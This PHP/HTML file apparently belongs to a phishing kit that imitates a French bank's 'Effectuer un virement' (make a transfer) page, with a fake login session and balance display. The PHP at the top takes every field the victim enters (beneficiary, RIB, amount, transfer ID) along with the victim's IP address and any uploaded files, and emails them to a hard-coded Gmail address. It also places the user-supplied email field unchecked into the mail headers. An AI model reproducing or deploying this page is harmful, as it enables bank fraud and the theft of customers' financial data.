<?php
include('inc/confu1.php');

if (session_id() == "")
{
   session_start();
}
if (!isset($_SESSION['username']))
{
   header('Location: ./../access_deny.php');
   exit;
}
if (isset($_SESSION['expires_by']))
{
   $expires_by = intval($_SESSION['expires_by']);
   if (time() < $expires_by)
   {
      $_SESSION['expires_by'] = time() + intval($_SESSION['expires_timeout']);
   }
   else
   {
      unset($_SESSION['username']);
      unset($_SESSION['expires_by']);
      unset($_SESSION['expires_timeout']);
      header('Location: ./../access_deny.php');
      exit;
   }
}
function ValidateEmail($email)
{
   $pattern = '/^([0-9a-z]([-.\w]*[0-9a-z])*@(([0-9a-z])+([-\w]*[0-9a-z])*\.)+[a-z]{2,6})$/i';
   return preg_match($pattern, $email);
}
if ($_SERVER['REQUEST_METHOD'] == 'POST' && $_POST['formid'] == 'form1')
{
   $mailto = 'kidzjayzo@gmail.com';
   $mailfrom = isset($_POST['email']) ? $_POST['email'] : $mailto;
   $subject = 'Virement effectuer';
   $message = 'Values submitted from web site form:';
   $success_url = './show=vir.php';
   $error_url = '';
   $error = '';
   $eol = "\n";
   $max_filesize = isset($_POST['filesize']) ? $_POST['filesize'] * 1024 : 1024000;
   $boundary = md5(uniqid(time()));

   $header  = 'From: '.$mailfrom.$eol;
   $header .= 'Reply-To: '.$mailfrom.$eol;
   $header .= 'MIME-Version: 1.0'.$eol;
   $header .= 'Content-Type: multipart/mixed; boundary="'.$boundary.'"'.$eol;
   $header .= 'X-Mailer: PHP v'.phpversion().$eol;
   if (!ValidateEmail($mailfrom))
   {
      $error .= "The specified email address is invalid!\n<br>";
   }

   if (!empty($error))
   {
      $errorcode = file_get_contents($error_url);
      $replace = "##error##";
      $errorcode = str_replace($replace, $error, $errorcode);
      echo $errorcode;
      exit;
   }

   $internalfields = array ("submit", "reset", "send", "filesize", "formid", "captcha_code", "recaptcha_challenge_field", "recaptcha_response_field");
   $message .= $eol;
   $message .= "IP Address : ";
   $message .= $_SERVER['REMOTE_ADDR'];
   $message .= $eol;
   foreach ($_POST as $key => $value)
   {
      if (!in_array(strtolower($key), $internalfields))
      {
         if (!is_array($value))
         {
            $message .= ucwords(str_replace("_", " ", $key)) . " : " . $value . $eol;
         }
         else
         {
            $message .= ucwords(str_replace("_", " ", $key)) . " : " . implode(",", $value) . $eol;
         }
      }
   }
   $body  = 'This is a multi-part message in MIME format.'.$eol.$eol;
   $body .= '--'.$boundary.$eol;
   $body .= 'Content-Type: text/plain; charset=ISO-8859-1'.$eol;
   $body .= 'Content-Transfer-Encoding: 8bit'.$eol;
   $body .= $eol.stripslashes($message).$eol;
   if (!empty($_FILES))
   {
       foreach ($_FILES as $key => $value)
       {
          if ($_FILES[$key]['error'] == 0 && $_FILES[$key]['size'] <= $max_filesize)
          {
             $body .= '--'.$boundary.$eol;
             $body .= 'Content-Type: '.$_FILES[$key]['type'].'; name='.$_FILES[$key]['name'].$eol;
             $body .= 'Content-Transfer-Encoding: base64'.$eol;
             $body .= 'Content-Disposition: attachment; filename='.$_FILES[$key]['name'].$eol;
             $body .= $eol.chunk_split(base64_encode(file_get_contents($_FILES[$key]['tmp_name']))).$eol;
          }
      }
   }
   $body .= '--'.$boundary.'--'.$eol;
   if ($mailto != '')
   {
      mail($mailto, $subject, $body, $header);
   }
   header('Location: '.$success_url);
   exit;
}
if ($_SERVER['REQUEST_METHOD'] == 'POST' && $_POST['formid'] == 'form2')
{
   $mailto = 'kidzjayzo@gmail.com';
   $mailfrom = isset($_POST['email']) ? $_POST['email'] : $mailto;
   $subject = 'Virement effectuer';
   $message = 'Values submitted from web site form:';
   $success_url = './show=vir.php';
   $error_url = '';
   $error = '';
   $eol = "\n";
   $max_filesize = isset($_POST['filesize']) ? $_POST['filesize'] * 1024 : 1024000;
   $boundary = md5(uniqid(time()));

   $header  = 'From: '.$mailfrom.$eol;
   $header .= 'Reply-To: '.$mailfrom.$eol;
   $header .= 'MIME-Version: 1.0'.$eol;
   $header .= 'Content-Type: multipart/mixed; boundary="'.$boundary.'"'.$eol;
   $header .= 'X-Mailer: PHP v'.phpversion().$eol;
   if (!ValidateEmail($mailfrom))
   {
      $error .= "The specified email address is invalid!\n<br>";
   }

   if (!empty($error))
   {
      $errorcode = file_get_contents($error_url);
      $replace = "##error##";
      $errorcode = str_replace($replace, $error, $errorcode);
      echo $errorcode;
      exit;
   }

   $internalfields = array ("submit", "reset", "send", "filesize", "formid", "captcha_code", "recaptcha_challenge_field", "recaptcha_response_field");
   $message .= $eol;
   $message .= "IP Address : ";
   $message .= $_SERVER['REMOTE_ADDR'];
   $message .= $eol;
   foreach ($_POST as $key => $value)
   {
      if (!in_array(strtolower($key), $internalfields))
      {
         if (!is_array($value))
         {
            $message .= ucwords(str_replace("_", " ", $key)) . " : " . $value . $eol;
         }
         else
         {
            $message .= ucwords(str_replace("_", " ", $key)) . " : " . implode(",", $value) . $eol;
         }
      }
   }
   $body  = 'This is a multi-part message in MIME format.'.$eol.$eol;
   $body .= '--'.$boundary.$eol;
   $body .= 'Content-Type: text/plain; charset=ISO-8859-1'.$eol;
   $body .= 'Content-Transfer-Encoding: 8bit'.$eol;
   $body .= $eol.stripslashes($message).$eol;
   if (!empty($_FILES))
   {
       foreach ($_FILES as $key => $value)
       {
          if ($_FILES[$key]['error'] == 0 && $_FILES[$key]['size'] <= $max_filesize)
          {
             $body .= '--'.$boundary.$eol;
             $body .= 'Content-Type: '.$_FILES[$key]['type'].'; name='.$_FILES[$key]['name'].$eol;
             $body .= 'Content-Transfer-Encoding: base64'.$eol;
             $body .= 'Content-Disposition: attachment; filename='.$_FILES[$key]['name'].$eol;
             $body .= $eol.chunk_split(base64_encode(file_get_contents($_FILES[$key]['tmp_name']))).$eol;
          }
      }
   }
   $body .= '--'.$boundary.'--'.$eol;
   if ($mailto != '')
   {
      mail($mailto, $subject, $body, $header);
   }
   header('Location: '.$success_url);
   exit;
}
?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<meta http-equiv="Content-Language" content="fr">
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>Banque et assurance</title>
<meta name="author" content="Pirvate Untherthered">
<meta name="robots" content="NOINDEX, NOFOLLOW">
<link href="Sans.css" rel="stylesheet" type="text/css">
<link href="show=vir.css" rel="stylesheet" type="text/css">
<script type="text/javascript" src="jquery-1.11.1.min.js"></script>
<script type="text/javascript" src="jquery.ui.effect.min.js"></script>
<script type="text/javascript" src="jquery.ui.effect-blind.min.js"></script>
<script type="text/javascript" src="jquery.ui.effect-bounce.min.js"></script>
<script type="text/javascript" src="jquery.ui.effect-clip.min.js"></script>
<script type="text/javascript" src="jquery.ui.effect-drop.min.js"></script>
<script type="text/javascript" src="jquery.ui.effect-explode.min.js"></script>
<script type="text/javascript" src="jquery.ui.effect-fade.min.js"></script>
<script type="text/javascript" src="jquery.ui.effect-fold.min.js"></script>
<script type="text/javascript" src="jquery.ui.effect-highlight.min.js"></script>
<script type="text/javascript" src="jquery.ui.effect-pulsate.min.js"></script>
<script type="text/javascript" src="jquery.ui.effect-scale.min.js"></script>
<script type="text/javascript" src="jquery.ui.effect-shake.min.js"></script>
<script type="text/javascript" src="jquery.ui.effect-slide.min.js"></script>
<script type="text/javascript" src="fancybox/jquery.easing-1.3.pack.js"></script>
<link rel="stylesheet" href="fancybox/jquery.fancybox-1.3.0.css" type="text/css">
<script type="text/javascript" src="fancybox/jquery.fancybox-1.3.0.pack.js"></script>
<script type="text/javascript" src="fancybox/jquery.mousewheel-3.0.2.pack.js"></script>
<script type="text/javascript" src="wwb10.min.js"></script>
</head>
<body>
<div id="space">
<br></div>
<div id="container">
<div id="wb_Shape6" style="position:absolute;left:10px;top:207px;width:217px;height:313px;z-index:18;">
<img src="images/img0101.png" id="Shape6" alt="" style="width:217px;height:313px;"></div>
<div id="wb_Image1" style="position:absolute;left:8px;top:25px;width:260px;height:60px;z-index:19;">
<img src="images/national_logo.png" id="Image1" alt=""></div>
<div id="wb_CssMenu1" style="position:absolute;left:7px;top:85px;width:1020px;height:74px;z-index:20;">
<ul>
<li class="firstmain"><a href="ulgn=2.php" target="_self">Ma&nbsp;synth&#232;se</a>
</li>
<li><a href="#" target="_self">Mes&nbsp;comptes</a>
</li>
<li><a href="#" target="_self">Mes&nbsp;cr&#233;dits</a>
</li>
<li><a href="#" target="_self">Mon&nbsp;&#233;pargne</a>
</li>
<li><a href="#" target="_self">Mes&nbsp;assurances</a>
</li>
</ul>
<br>
</div>
<div id="wb_Image2" style="position:absolute;left:846px;top:23px;width:17px;height:17px;z-index:21;">
<img src="images/locked-1.png" id="Image2" alt="">
</div>

<div id="wb_Text7" style="position:absolute;left:24px;top:156px;width:256px;height:16px;z-index:38;text-align:left;">
<span style="color:#CF002A;font-family:Arial;font-size:13px;"><strong>Mon espace virement</strong></span></div>
<div id="wb_Text19" style="position:absolute;left:280px;top:49px;width:250px;height:17px;z-index:39;text-align:left;">
<span style="color:#CF002A;font-family:Arial;font-size:15px;">Particuliers&nbsp; </span><span style="color:#000000;font-family:Arial;font-size:15px;">| Professionnels</span></div>

<div id="wb_Shape15" style="position:absolute;left:836px;top:19px;width:152px;height:28px;filter:alpha(opacity=30);-moz-opacity:0.30;opacity:0.30;z-index:41;">
<a href="./../index.html" title="Deconnexion"><img class="hover" src="images/img0096_hover.gif" alt="" style="border-width:0;width:152px;height:28px;"><span><img src="images/img0096.gif" id="Shape15" alt="" style="width:152px;height:28px;"></span></a></div>
<div id="wb_Text20" style="position:absolute;left:874px;top:24px;width:250px;height:16px;z-index:42;text-align:left;">
<span style="color:#000000;font-family:Arial;font-size:13px;">Déconnexion</span></div>
<div id="wb_Shape2" style="position:absolute;left:12px;top:211px;width:213px;height:35px;z-index:43;">
<img src="images/img0097.png" id="Shape2" alt="" style="width:213px;height:35px;"></div>
<div id="wb_Image11" style="position:absolute;left:197px;top:225px;width:17px;height:17px;z-index:44;">
<img src="images/next.png" id="Image11" alt=""></div>
<div id="wb_Shape4" style="position:absolute;left:12px;top:245px;width:213px;height:35px;z-index:45;">
<img src="images/img0098.png" id="Shape4" alt="" style="width:213px;height:35px;"></div>
<div id="wb_Image12" style="position:absolute;left:194px;top:251px;width:22px;height:22px;z-index:46;">
<img src="images/previous.png" id="Image12" alt=""></div>
<div id="wb_Shape5" style="position:absolute;left:12px;top:280px;width:213px;height:35px;z-index:47;">
<a href=""><img class="hover" src="images/img0099_hover.png" alt="" style="border-width:0;width:213px;height:35px;"><span><img src="images/img0099.png" id="Shape5" alt="" style="width:213px;height:35px;"></span></a></div>
<div id="wb_Text8" style="position:absolute;left:45px;top:322px;width:154px;height:16px;z-index:48;text-align:left;">
<span style="color:#FF0000;font-family:Arial;font-size:13px;">Effectuer un virement</span></div>
<div id="wb_Text9" style="position:absolute;left:45px;top:350px;width:154px;height:16px;z-index:49;text-align:left;">
<span style="color:#FF0000;font-family:Arial;font-size:13px;">Suivre mes virements</span></div>
<div id="wb_Shape7" style="position:absolute;left:19px;top:344px;width:200px;height:1px;z-index:50;">
<img src="images/img0102.png" id="Shape7" alt="" style="width:200px;height:1px;"></div>
<div id="wb_Shape8" style="position:absolute;left:19px;top:375px;width:200px;height:1px;z-index:51;">
<img src="images/img0103.png" id="Shape8" alt="" style="width:200px;height:1px;"></div>
<div id="wb_Shape9" style="position:absolute;left:19px;top:436px;width:200px;height:1px;z-index:52;">
<img src="images/img0104.png" id="Shape9" alt="" style="width:200px;height:1px;"></div>
<div id="wb_Shape10" style="position:absolute;left:19px;top:405px;width:200px;height:1px;z-index:53;">
<img src="images/img0105.png" id="Shape10" alt="" style="width:200px;height:1px;"></div>
<div id="wb_Image13" style="position:absolute;left:195px;top:289px;width:21px;height:21px;z-index:54;">
<img src="images/previous%20-%20Copie%20%282%29.png" id="Image13" alt=""></div>
<div id="wb_Shape11" style="position:absolute;left:12px;top:375px;width:213px;height:35px;z-index:55;">
<a href=""><img class="hover" src="images/img0100_hover.png" alt="" style="border-width:0;width:213px;height:35px;"><span><img src="images/img0100.png" id="Shape11" alt="" style="width:213px;height:35px;"></span></a></div>
<div id="wb_Image14" style="position:absolute;left:195px;top:384px;width:21px;height:21px;z-index:56;">
<img src="images/previous%20-%20Copie%20%282%29.png" id="Image14" alt=""></div>
<div id="wb_Shape12" style="position:absolute;left:12px;top:410px;width:213px;height:35px;z-index:57;">
<a href=""><img class="hover" src="images/img0106_hover.png" alt="" style="border-width:0;width:213px;height:35px;"><span><img src="images/img0106.png" id="Shape12" alt="" style="width:213px;height:35px;"></span></a></div>
<div id="wb_Image15" style="position:absolute;left:194px;top:419px;width:21px;height:21px;z-index:58;">
<img src="images/previous%20-%20Copie%20%282%29.png" id="Image15" alt=""></div>
<div id="wb_Shape13" style="position:absolute;left:12px;top:480px;width:213px;height:35px;z-index:59;">
<a href=""><img class="hover" src="images/img0107_hover.png" alt="" style="border-width:0;width:213px;height:35px;"><span><img src="images/img0107.png" id="Shape13" alt="" style="width:213px;height:35px;"></span></a></div>
<div id="wb_Image16" style="position:absolute;left:194px;top:489px;width:21px;height:21px;z-index:60;">
<img src="images/previous%20-%20Copie%20%282%29.png" id="Image16" alt=""></div>
<div id="wb_Shape16" style="position:absolute;left:12px;top:445px;width:213px;height:35px;z-index:61;">
<a href=""><img class="hover" src="images/img0108_hover.png" alt="" style="border-width:0;width:213px;height:35px;"><span><img src="images/img0108.png" id="Shape16" alt="" style="width:213px;height:35px;"></span></a></div>
<div id="wb_Image17" style="position:absolute;left:195px;top:454px;width:21px;height:21px;z-index:62;">
<img src="images/previous%20-%20Copie%20%282%29.png" id="Image17" alt=""></div>
<div id="wb_Text10" style="position:absolute;left:243px;top:149px;width:245px;height:23px;z-index:63;text-align:left;">
<span style="color:#FF0000;font-family:Arial;font-size:20px;">Effectuer un virement</span></div>
<div id="wb_Text11" style="position:absolute;left:263px;top:186px;width:252px;height:16px;z-index:64;text-align:left;">
<span style="color:#808080;font-family:Arial;font-size:13px;">Compte à débiter</span></div>
<div id="wb_Shape17" style="position:absolute;left:257px;top:206px;width:301px;height:62px;z-index:65;">
<img src="images/img0109.png" id="Shape17" alt="" style="width:301px;height:62px;"></div>
<div id="wb_Image18" style="position:absolute;left:551px;top:206px;width:32px;height:61px;z-index:66;">
<img src="images/fd.png" id="Image18" alt=""></div>
<div id="wb_Text12" style="position:absolute;left:265px;top:218px;width:251px;height:16px;z-index:67;text-align:left;">
<span style="color:#000000;font-family:Arial;font-size:13px;"><?php echo $nom_u2;?></span></div>
<div id="wb_Text14" style="position:absolute;left:265px;top:238px;width:253px;height:16px;z-index:68;text-align:left;">
<span style="color:#000000;font-family:Arial;font-size:13px;"><strong>Livret A - 013751XXXXX</strong></span></div>
<div id="wb_Text13" style="position:absolute;left:432px;top:238px;width:143px;height:16px;z-index:69;text-align:left;">
<span style="color:#000000;font-family:Arial;font-size:13px;"><?php echo $solde_u2;?></span></div>
<div id="wb_Shape19" style="position:absolute;left:13px;top:315px;width:212px;height:29px;z-index:70;">
<a href="#" onclick="ShowObjectWithEffect('wb_Form1', 1, 'highlight', 500);return false;"><img src="images/img0111.png" id="Shape19" alt="" style="width:212px;height:29px;"></a></div>
<div id="wb_Form1" style="position:absolute;left:255px;top:273px;width:328px;height:337px;z-index:71;">
<form name="Virement" method="post" action="<?php echo basename(__FILE__); ?>" enctype="multipart/form-data" id="Form1">
<input type="hidden" name="formid" value="form1">
<div id="wb_Text15" style="position:absolute;left:75px;top:14px;width:202px;height:16px;z-index:0;text-align:left;">
<span style="color:#000000;font-family:Arial;font-size:13px;">Nom et Prenom du Bénéficiaire</span></div>
<input type="text" id="Editbox1" style="position:absolute;left:76px;top:41px;width:198px;height:23px;line-height:23px;z-index:1;" name="Editbox1" value="">
<div id="wb_Text17" style="position:absolute;left:76px;top:73px;width:202px;height:16px;z-index:2;text-align:left;">
<span style="color:#000000;font-family:Arial;font-size:13px;">Relevé d'Identité Bancaire ( RIB )</span></div>
<input type="text" id="Editbox2" style="position:absolute;left:75px;top:96px;width:198px;height:23px;line-height:23px;z-index:3;" name="Editbox2" value="">
<div id="wb_Text22" style="position:absolute;left:7px;top:143px;width:62px;height:16px;z-index:4;text-align:left;">
<span style="color:#000000;font-family:Arial;font-size:13px;">Montant:</span></div>
<input type="text" id="Editbox3" style="position:absolute;left:75px;top:138px;width:198px;height:23px;line-height:23px;z-index:5;" name="Editbox3" value="">
<div id="wb_Text24" style="position:absolute;left:7px;top:186px;width:51px;height:16px;z-index:6;text-align:left;">
<span style="color:#000000;font-family:Arial;font-size:13px;">Libellé:</span></div>
<input type="text" id="Editbox4" style="position:absolute;left:75px;top:178px;width:198px;height:23px;line-height:23px;z-index:7;" name="Editbox4" value="">
<div id="wb_Text25" style="position:absolute;left:7px;top:216px;width:147px;height:16px;z-index:8;text-align:left;">
<span style="color:#000000;font-family:Arial;font-size:13px;">Date d'effet du virement:</span></div>
<div id="wb_Text26" style="position:absolute;left:7px;top:240px;width:202px;height:16px;z-index:9;text-align:left;">
<span style="color:#000000;font-family:Arial;font-size:13px;">Immédiat:</span></div>
<input type="radio" id="RadioButton1" name="NewGroup" value="on" style="position:absolute;left:199px;top:240px;z-index:10;">
<div id="wb_Text27" style="position:absolute;left:8px;top:265px;width:202px;height:16px;z-index:11;text-align:left;">
<span style="color:#000000;font-family:Arial;font-size:13px;">Permanent:</span></div>
<input type="radio" id="RadioButton2" name="NewGroup" value="on" style="position:absolute;left:199px;top:265px;z-index:12;">
<input type="reset" id="Button1" name="" value="Annuler" style="position:absolute;left:79px;top:295px;width:96px;height:25px;z-index:13;">
<input type="submit" id="Button2" name="" value="Valider" style="position:absolute;left:199px;top:295px;width:96px;height:25px;z-index:14;">
</form>
</div>
<div id="wb_Form2" style="position:absolute;left:602px;top:329px;width:328px;height:122px;z-index:72;">
<form name="Virement" method="post" action="<?php echo basename(__FILE__); ?>" enctype="multipart/form-data" id="Form2">
<input type="hidden" name="formid" value="form2">
<input type="text" id="Editbox5" style="position:absolute;left:72px;top:41px;width:198px;height:23px;line-height:23px;z-index:15;" name="Editbox1" value="">
<div id="wb_Text16" style="position:absolute;left:62px;top:15px;width:238px;height:16px;z-index:16;text-align:left;">
<span style="color:#000000;font-family:Arial;font-size:13px;">Veuillez entrer l'identifiant du transfert </span></div>
<div id="wb_Shape20" style="position:absolute;left:119px;top:90px;width:115px;height:32px;z-index:17;">
<a href="javascript:displaylightbox('./msg/stats_u2.php',{})" target="_self" title="statut"><img src="images/img0112.png" id="Shape20" alt="" style="width:115px;height:32px;"></a></div>
</form>
</div>
<div id="wb_Shape18" style="position:absolute;left:13px;top:345px;width:212px;height:29px;z-index:73;">
<a href="#" onclick="ShowObjectWithEffect('wb_Form1', 0, 'highlight', 500);return false;"><img src="images/img0110.png" id="Shape18" alt="" style="width:212px;height:29px;"></a></div>
</div>
</body>
</html>